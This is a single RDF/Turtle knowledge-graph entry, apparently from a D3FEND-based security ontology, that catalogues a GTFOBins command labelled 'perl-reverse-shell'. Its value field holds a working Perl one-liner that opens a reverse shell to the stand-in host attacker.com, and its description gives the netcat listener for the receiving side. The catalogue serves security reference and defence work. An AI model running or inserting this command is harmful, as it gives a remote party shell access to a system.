mknd:command_perl-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "perl-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_perl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_perl ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
""" .

